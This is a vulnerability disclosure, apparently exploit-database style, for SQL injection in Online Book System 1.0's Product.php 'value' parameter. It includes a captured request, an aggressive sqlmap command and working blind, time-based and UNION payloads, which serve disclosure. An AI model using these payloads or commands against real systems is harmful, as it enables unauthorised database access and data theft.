# Online Book System- SQL Injection - 3
+ **Exploit Title:** Online Book System- SQL Injection
+ **Date:** 2024-26-03
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/online-book-system-in-php-css-js-and-mysql-free-download/
+ **Software Link:** https://download.code-projects.org/details/74c24d93-431e-4e31-acc1-802f14caef5c
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Online Book System 1.0 allows SQL Injection via the 'value' parameter at "localhost/BookStore-master 1/Product.php". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "localhost/BookStore-master 1/Product.php"
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
GET /BookStore-master%201/Product.php?value=entrance%20exam HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36

```

+ Use sqlmap to exploit. In sqlmap, use 'value' parameter to dump the database.
```
sqlmap -r r.txt -p value --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: value (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: value=entrance exam' AND 6302=6302-- UDjO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: value=entrance exam' AND (SELECT 1704 FROM (SELECT(SLEEP(5)))wPKG)-- KJpp

    Type: UNION query
    Title: Generic UNION query (NULL) - 14 columns
    Payload: value=entrance exam' UNION ALL SELECT CONCAT(0x716b786a71,0x574b6549785a614e7a58724d414b51614e706c536b53415363697854594d4c7a59726258586e5942,0x716a6b6271),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
---
[11:07:38] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[11:07:39] [INFO] fetching current database
current database: 'u385439067_store'

```
+ current database: `u385439067_store`

![Ekran görüntüsü 2024-03-26 181104](https://github.com/BurakSevben/CVEs/assets/117217689/e1084e89-8710-4374-b9b0-06fe7d3c3901)
